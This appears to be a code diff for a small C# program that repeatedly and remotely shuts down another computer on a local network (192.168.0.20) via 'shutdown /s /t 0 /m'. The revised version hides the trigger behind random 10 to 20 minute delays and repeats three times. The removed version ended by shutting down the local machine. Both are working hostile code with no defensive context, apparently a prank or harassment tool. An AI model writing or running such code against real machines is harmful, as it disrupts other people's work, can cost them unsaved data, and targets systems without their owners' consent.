@@ -1,21 +1,14 @@
 ﻿int countDown = 0;
-string cmdText = "/K shutdown /s /t 0 /m \\192.168.0.20";
-while (true)
-{
+KD();
+void KD() {
     Random random = new Random();
-    int randomNumber =  random.Next(1, 1000);
-    if (randomNumber == 500)
-    {
-        countDown++;
-        ShutDown();
-        
-    }
-    if (countDown == 3)
-    {
-        cmdText = "/K shutdown /s /t 0 /m";
-        ShutDown();
-        return;
-    }
+    int randomNumber = random.Next(600000, 1200000);
+    Console.WriteLine(randomNumber);
+    Thread.Sleep(randomNumber);
+    ShutDown();
+    countDown++;
+    if (countDown == 3)  return;
+    KD();
 }
 
-void ShutDown() => System.Diagnostics.Process.Start("CMD.exe",cmdText);
+void ShutDown(string cmdText = "/K shutdown /s /t 0 /m \\192.168.0.20") => System.Diagnostics.Process.Start("CMD.exe",cmdText);
